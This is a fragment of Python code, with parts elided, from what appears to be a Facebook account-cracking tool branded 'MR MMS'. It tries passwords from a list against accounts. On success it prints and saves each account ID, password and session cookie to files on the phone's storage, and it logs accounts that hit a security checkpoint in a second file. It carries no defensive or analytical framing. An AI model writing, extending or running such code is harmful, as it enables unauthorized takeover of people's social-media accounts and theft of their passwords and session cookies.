...
def cek_apk(session,coki):
  ...
  #____________#
def xyz():
    #os.system("xdg-open https://www.facebook.com/musa.khan39545")
    os.getuid
    os.system("clear")
    print('         \x1b[97m[\033[37;41m  THIS COMMAND MADE BY MR MMS \033[0;97m] ')
    os.system("xdg-open https://www.facebook.com/musa.khan.39545");print(logo)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[MMS-OK😁]●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nNUMBER : '+uid+'\nPASSWORD   : '+cid+' Ã¢Ë†Å¡ '+ps+ '\nCOOKIE   : '+coki+'\n●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
                cek_apk(session,coki)
                open('/sdcard/MMS-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r\033[1;31m [MMS-CP😔] \nNUMBER : '+uid+'\nPASSWORD   : '+ps+ '\n------------------------------------')
                open('/sdcard/MMS-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
